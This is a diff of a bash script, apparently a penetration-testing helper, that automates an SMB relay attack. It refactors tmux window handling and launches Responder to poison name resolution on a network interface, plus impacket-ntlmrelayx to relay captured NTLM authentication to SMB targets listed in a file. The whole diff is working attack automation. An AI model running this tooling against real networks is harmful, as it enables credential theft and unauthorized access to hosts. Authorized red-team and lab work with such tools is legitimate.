@@ -86,22 +86,48 @@ if [ -f "${responder_config_file}" ]; then
     fi
 }
 
-# Run SMB Relay Attack
+# Function to start or attach to a tmux session and initialize windows
+start_tmux_window() {
+    local session_name=$1
+    local window_name=$2
+    local command=$3
+    
+    # Create the window in the tmux session
+    tmux new-window -t "$session_name" -n "$window_name"
+    
+    # Send the command to the new tmux window
+    tmux send-keys -t "$session_name:$window_name" "$command" C-m
+}
+
+# Function to execute SMB relay attack in tmux
 run_smb_relay_attack() {
     echo -e "[*] ${BLUE}Starting SMB Relay Attack...${NC}"
-    tmux new-session -d -s $session_name
-    echo -e "[+] ${GREEN}Creating tmux session named ${session_name}.${NC}"
-    
-    tmux rename-window $window1
-    echo -e "[+] ${GREEN}Starting Responder in window ${window1}.${NC}"
-    tmux send-keys "responder -I ${network_interface}" C-m
 
-    tmux new-window -n $window2
-    echo -e "[+] ${GREEN}Starting ntlmrelayx in window ${window2}.${NC}"
-    tmux send-keys "impacket-ntlmrelayx -smb2support -tf ${TARGET_SMB_FILE}" C-m
+    # Ensure tmux session exists
+    if ! tmux has-session -t "$session_name" 2>/dev/null; then
+        echo -e "[+] ${GREEN}Creating tmux session: $session_name.${NC}"
+        tmux new-session -d -s "$session_name"
+    fi
 
-    tmux -CC attach-session -t $session_name
+    # Start Responder in a tmux window
+    echo -e "${CYAN}Starting Responder on interface $network_interface...${RESET}"
+    start_tmux_window "$session_name" "responder" "responder -I $network_interface" || {
+        echo -e "${RED}Failed to start Responder.${RESET}"
+        exit 1
+    }
+
+    # Start ntlmrelayx in another tmux window
+    echo -e "${CYAN}Starting impacket-ntlmrelayx with target file ${TARGET_SMB_FILE}...${RESET}"
+    start_tmux_window "$session_name" "ntlmrelayx" "impacket-ntlmrelayx -smb2support -tf ${TARGET_SMB_FILE}" || {
+        echo -e "${RED}Failed to start ntlmrelayx.${RESET}"
+        exit 1
+    }
+
+    # Attach to the tmux session
+    tmux -CC attach-session -t "$session_name"
 }
+
+
 
 while getopts "f:hi:" opt; do
     case $opt in
